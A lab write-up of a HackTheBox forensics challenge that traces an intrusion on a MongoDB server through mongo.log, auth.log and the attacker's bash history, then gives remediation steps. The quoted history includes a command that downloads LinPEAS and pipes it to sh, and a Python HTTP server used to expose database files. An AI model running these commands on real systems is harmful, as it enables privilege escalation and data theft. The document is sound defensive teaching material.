# **HTB Sherlock - MangoBleed | Entry Level | DFIR** 

### *Setup:* 

The task is to investigate a suspected compromise on a secondary MongoDB server (mongodbsync) using the provided UAC (Unix-like Artifact Collector) triage acquisition and root-level access. Identify attacker activity and present findings in an incident assessment and recommended next steps.

### *Attack Timeline:*

```
1. MongoDB reconnaissance from 65.0.76.43
```
```
2. SSH brute-force
```
```
3. Successful SSH auth
```
```
4. Failed sudo attempt
```
```
5. LinPEAS accessed for privilege escalation
```
```
6. MongoDB directory accessed/server started
```
```
7. Potential exfiltration
```

### *Analysis:*

It is prudent for us to first identify the vulnerability, if possible, and find any initial information. A quick search in the CVE (Common Vulnerabilities and Exposures) database gives us a result for 'mongobleed'. There is a high-severity entry under CVE-2025-14847:

*"Mismatched length fields in Zlib compressed protocol headers may allow a read of uninitialized heap memory by an unauthenticated client".*

CVE explains that this vulnerability affects a range of MongoDB Server versions. We will determine our version before moving forward with further analysis. We can do this by opening the provided triage folder and simply searching for 'mongo', this gives us 'mongo.log'. If we open this file and CTRL + F for 'version', we find that the MongoDB version is v8.0.16. The CVE page shows that MongoDB Server v8.0 versions, prior to 8.0.17, are affected. This shows us a plausible access vector; certainly worth investigation.
We can now look at connections to the server. Using the same mongo.log file, we can search for likely keywords such as; 'connection', 'connection successful', 'connection accepted'. In our case the latter gave us the following entry:

```
{"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"s":"I",  "c":"NETWORK",  "id":22943,   "ctx":"listener","msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340","isLoadBalanced":false,"uuid":{"uuid":{"$uuid":"099e057e-11c1-46ed-b129-a158578d2014"}},"connectionId":1,"connectionCount":1}}
```

We can see that a remote connection, on the public IP address 65.0.76.43 connected. The connection is then ended within a few milliseconds. This continues for thousands of log entries over the next couple of minutes. In fact, there are 75260 entries containing that address (including connection accepted and connection ended). These could be automated and might indicate some sort of reconnaissance tool. We cannot jump to conclusions yet, but the IP address is certainly worth our attention. 

We now need more information to confirm if/when the server was accessed. The mongo.log file has revealed useful networking data, but we can find the auth.log file to hopefully gain more insight. A search in the triage folder for auth.log reveals this (located in /var/log). We can see that a user, with the suspect IP address, is trying to login to the mongoadmin account. There are many rapid-fire attempts via SSH, some examples here: 

```
2025-12-29T05:39:19.381375+00:00 ip-172-31-38-170 sshd[39844]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.478221+00:00 ip-172-31-38-170 sshd[39845]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.545976+00:00 ip-172-31-38-170 sshd[39846]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:19.554759+00:00 ip-172-31-38-170 sshd[39847]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
```

We can be confident of some form of brute-force attack, as there are log entries which show SSH dropping sessions as a self-protection. We end up with a successful authentication from the suspect IP before a failed sudo authentication:

```
2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
2025-12-29T05:42:03.072922+00:00 ip-172-31-38-170 sudo: pam_unix(sudo:auth): authentication failure; logname=mongoadmin uid=1001 euid=0 tty=/dev/pts/0 ruser=mongoadmin rhost=  user=mongoadmin
```

At this point we are advised to identify the command line used to execute an in‑memory script, as part of the attacker's privilege‑escalation attempt. We can see that their sudo authentication was unsuccessful, perhaps they will look at privilege-escalation? I spent time browsing around the various files provided from the triage, including parsing a wtmp file using a Python script. No new information was gained. I eventually discovered that there is a hidden bash history file, in the user folder. We can investigate [root]/home/mongoadmin/. and we are suggested the bash_history file. We immediately see that the user entered a command to access linpeas:

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

An online search shows that LinPEAS is a very common tool used for privilege escalation. The script was made to find possible privilege escalation vectors. The attacker then navigates to cd /var/lib/mongodb/ before installing zip, presumably to package and exfiltrate data from /var/lib/mongodb. Finally, they input the following command:

```
python3 -m http.server 6969
```

... thus exposing the files and allowing for potential exfiltration.

### *Summary/Next Steps:*

The attacker gained unauthorized SSH access to the mongoadmin account. There's some evidence that suggests that privilege escalation was attempted, and intent to extract MongoDB data. Further investigation is needed to confirm whether data exfiltration was successful.

The advice is as follows: reset credentials associated with the mongoadmin account. Review SSH access. Patch MongoDB to a version not affected by CVE-2025-14847. Restrict MongoDB exposure to trusted networks. Investigate logs for evidence of data exfiltration. Review user permissions to identify potential privilege escalation paths. Implement monitoring for suspicious activity.




